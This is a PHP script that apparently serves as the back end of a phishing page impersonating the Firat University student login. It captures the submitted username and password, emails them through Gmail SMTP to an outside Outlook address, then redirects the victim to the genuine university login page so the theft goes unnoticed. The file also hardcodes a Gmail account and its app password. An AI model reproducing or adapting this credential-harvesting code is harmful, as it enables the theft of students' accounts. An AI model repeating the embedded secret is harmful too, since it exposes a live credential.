<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'src/Exception.php';
require 'src/PHPMailer.php';
require 'src/SMTP.php';

$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';  // Gmail SMTP sunucusu
    $mail->SMTPAuth   = true;
    $mail->Username   = 'satakanemre@gmail.com';  // Gmail kullanıcı adınız
    $mail->Password   = 'gzhmikcyiadevrka';  // Gmail Uygulama Şifreniz
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;

    // Recipients
    $mail->setFrom('satakanemre@gmail.com', 'Giris Bilgileri');
    $mail->addAddress('atakan21@outlook.com', 'Atakan Emre'); // Alıcı adresi

    // Content
    $mail->isHTML(true);
    $mail->Subject = 'Yeni Giris Denemesi';
    $mail->Body    = 'Kullanici adi: ' . $_POST['username'] . '<br>sifre: ' . $_POST['password'];

    $mail->send();
    
    // Mesaj başarıyla gönderildikten sonra firat.edu.tr'ye yönlendirme
    header('Location: https://jasig.firat.edu.tr/cas/login?service=https://obs.firat.edu.tr/oibs/ogrenci');
    exit;
} catch (Exception $e) {
    echo "Mesaj gönderilemedi. Hata: " . $mail->ErrorInfo;
}
?>
